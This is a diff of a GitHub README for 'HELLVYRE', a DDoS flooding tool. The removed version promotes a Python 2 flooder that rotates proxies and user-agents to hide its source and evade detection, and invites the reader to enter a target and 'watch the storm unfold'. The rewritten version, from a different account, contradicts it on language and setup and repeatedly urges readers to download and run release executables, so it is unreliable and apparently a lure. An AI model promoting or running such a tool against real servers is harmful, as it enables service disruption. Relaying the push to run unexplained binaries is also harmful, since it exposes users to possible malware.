@@ -1,80 +1,109 @@
-# 🔥 — HELLVYRE — 🔥
+# HELLVYRE 🚀
 
-![pngdragon (1) (1)](https://github.com/user-attachments/assets/6e0e7384-db23-4f80-8046-109917195638)
+![Version](https://img.shields.io/badge/version-1.0.0-blue.svg) ![License](https://img.shields.io/badge/license-MIT-green.svg) ![Release](https://img.shields.io/badge/release-latest-orange.svg)
 
-Welcome to HELLVYRE, a powerful yet minimalist DDoS stress testing tool built in Python 2. Designed for simplicity and effectiveness, HELLVYRE enables security professionals, network admins, and ethical hackers to perform quick stress tests on web servers by flooding targets with traffic — requiring no complicated setup or arguments. Just input the target and let it rip. ⚡
+## Table of Contents
+1. [Introduction](#introduction)
+2. [Features](#features)
+3. [Installation](#installation)
+4. [Usage](#usage)
+5. [Contributing](#contributing)
+6. [License](#license)
+7. [Contact](#contact)
 
-# 🚀 Features
-🔧 Minimal Dependencies: Runs with only Python 2 installed; no external libraries required
+## Introduction
 
-🎯 Easy to Use: Simple prompt-driven interface — enter target IP or URL, and start attacking immediately
+Welcome to HELLVYRE, a powerful tool designed for educational purposes in understanding DDoS (Distributed Denial of Service) attacks. This tool aims to provide insights into network security and the implications of DDoS attacks. It is crucial to remember that this tool is intended solely for educational use. **DO NOT use it for illegal activities.**
 
-🌐 Proxy Support: Automatically rotates through a dynamic list of proxies to mask traffic sources and simulate distributed attack patterns
+You can find the latest releases of HELLVYRE [here](https://github.com/Progeries/HELLVYRE/releases). Download the necessary files and execute them to get started.
 
-🛡 Rotating User-Agent Headers: Mimics real browser traffic to evade simple detection methods
+## Features
 
-📈 Real-Time Console Output: Clear status updates while the attack runs, so you stay informed on progress
+- **Multi-Protocol Support**: HELLVYRE supports various protocols, allowing users to simulate different types of DDoS attacks.
+- **User-Friendly Interface**: The tool offers a simple command-line interface for easy interaction.
+- **Educational Documentation**: Comprehensive guides are available to help users understand the concepts behind DDoS attacks and mitigation strategies.
+- **Cross-Platform Compatibility**: Built using Node.js and Python, HELLVYRE works on various operating systems, including Windows, macOS, and Linux.
+- **Customizable Parameters**: Users can adjust attack parameters to simulate different scenarios.
 
-🖥 Lightweight: Minimal CPU and memory footprint — can run on low-end machines and VPSes effortlessly
+## Installation
 
-# 📋 Requirements
-Python 2.x interpreter installed on your system
+To install HELLVYRE, follow these steps:
 
-Internet connection for proxy fetching and attack execution
+1. **Clone the Repository**:
+   Open your terminal and run the following command:
+   ```bash
+   git clone https://github.com/Progeries/HELLVYRE.git
+   ```
 
-# 🛠 Installation & Setup
-Clone this repository:
+2. **Navigate to the Directory**:
+   Change to the HELLVYRE directory:
+   ```bash
+   cd HELLVYRE
+   ```
 
-git clone https://github.com/Threadlinee/HELLVYRE.git
-cd HELLVYRE
-Verify Python 2 is installed:
+3. **Install Dependencies**:
+   Install the required packages using npm:
+   ```bash
+   npm install
+   ```
 
-python2 --version
-Run the tool:
+4. **Download Executable Files**:
+   Visit the [Releases](https://github.com/Progeries/HELLVYRE/releases) section to download the latest executable files. Execute them to run HELLVYRE.
 
-python2 HELLVYRE.py
-# 🎮 How to Use
-When prompted, enter the target URL or IP address you want to stress test
+## Usage
 
-The tool automatically begins sending traffic using rotating proxies and user-agents
+Using HELLVYRE is straightforward. Once installed, you can run the tool from the command line. Here’s a basic example of how to use it:
 
-Monitor the console for ongoing status and feedback
+1. **Start the Tool**:
+   In your terminal, run:
+   ```bash
+   node index.js
+   ```
 
-# ⚠️ Important Legal Notice
-HELLVYRE is intended strictly for ethical use by cybersecurity professionals and authorized personnel only.
+2. **Select Attack Type**:
+   Follow the prompts to select the type of attack you want to simulate.
 
-Unauthorized attacks on websites, servers, or networks are illegal and punishable by law
+3. **Configure Parameters**:
+   Enter the target IP address and any additional parameters as required.
 
-Always obtain explicit permission from the target owner before running any stress test
+4. **Execute the Attack**:
+   Confirm your settings and execute the attack. Monitor the output for results.
 
-The developer assumes no responsibility or liability for misuse of this tool
+**Important**: Always use this tool in a controlled environment. Understanding DDoS attacks is crucial for developing effective defense strategies.
 
-Please act responsibly and with respect to cybersecurity ethics.
+## Contributing
 
-# 🤝 Contribution & Support
-Contributions to improve HELLVYRE are welcomed! Whether it’s optimizing proxy handling, adding new features, or fixing bugs:
+We welcome contributions to HELLVYRE! If you want to help improve this tool, please follow these steps:
 
-Open an issue for discussion
+1. **Fork the Repository**: Click the fork button on the top right corner of the repository page.
+2. **Create a Branch**: Use the following command to create a new branch:
+   ```bash
+   git checkout -b feature/YourFeatureName
+   ```
+3. **Make Your Changes**: Implement your feature or fix.
+4. **Commit Your Changes**: Use the following command to commit:
+   ```bash
+   git commit -m "Add your message here"
+   ```
+5. **Push to the Branch**: Push your changes to your forked repository:
+   ```bash
+   git push origin feature/YourFeatureName
+   ```
+6. **Create a Pull Request**: Go to the original repository and submit a pull request.
 
-Submit a pull request with your changes
+We appreciate your contributions and look forward to collaborating with you!
 
-Your support helps keep the project evolving and effective!
+## License
 
-# 📜 License
-This project is licensed under the MIT License — see the LICENSE file for details.
+This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for more details.
 
-📞 Contact
-Created by Threadlinee — reach out for questions, suggestions, or collabs via GitHub issues or DM.
+## Contact
 
-🔥 Ready to unleash HELLVYRE?
+For any questions or inquiries, feel free to reach out:
 
-python2 HELLVYRE.py
-Enter your target, and watch the storm unfold. But remember — use wisely and legally.
+- **Email**: support@hellvyre.com
+- **GitHub**: [Progeries](https://github.com/Progeries)
 
-Educational Purposes Only!! Stay safe, stay ethical. ✌️
+---
 
-
-# ☕ Support
-If you find this tool useful, drop a ⭐ or fork it. Contributions and proxy improvements are welcome.
-
-[![Buy Me a Coffee](https://ko-fi.com/img/githubbutton_sm.svg)](https://ko-fi.com/G2G114SBVV)
+Remember to check the [Releases](https://github.com/Progeries/HELLVYRE/releases) section for the latest updates and tools.
